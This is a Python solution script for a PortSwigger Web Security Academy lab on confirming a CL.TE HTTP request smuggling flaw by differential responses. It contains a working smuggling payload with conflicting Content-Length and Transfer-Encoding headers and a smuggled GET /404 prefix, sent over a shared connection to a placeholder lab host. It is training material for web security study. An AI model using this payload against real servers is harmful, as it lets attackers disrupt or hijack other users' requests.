"""
Lab 4: Confirming a CL.TE vulnerability via differential responses
https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-clte-via-differential-responses
Difficulty: Practitioner

📝 Instead of relying on timing, smuggle a prefix that makes the NEXT
request on the SAME connection come back visibly different than normal
(the smuggled bytes prepend a bogus GET /404 that eats the real follow-up
request's start line, causing it to 404 too).
"""

from utils import send_same_connection, normalize_crlf, log, note, summarize_response

HOST = "YOUR-LAB-ID.web-security-academy.net"

SMUGGLE_PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X""".format(host=HOST))

NORMAL_FOLLOWUP = normalize_crlf("""GET / HTTP/1.1
Host: {host}

""".format(host=HOST))


def run():
    note("Sending the smuggle payload immediately followed by a normal GET /")
    note("on the SAME connection, so the smuggled prefix can affect it.")

    (r1, _), (r2, _) = send_same_connection(HOST, [SMUGGLE_PAYLOAD, NORMAL_FOLLOWUP])
    summarize_response(r1, "Smuggle request response")
    summarize_response(r2, "Follow-up GET / response")

    if b" 404 " in r2.split(b"\r\n", 1)[0]:
        log("Confirmed: follow-up request came back 404 — smuggled prefix landed.")
    else:
        note("No 404 shift seen — try adjusting Content-Length by 1 in either")
        note("direction; the exact boundary is sensitive to off-by-one errors.")


if __name__ == "__main__":
    run()
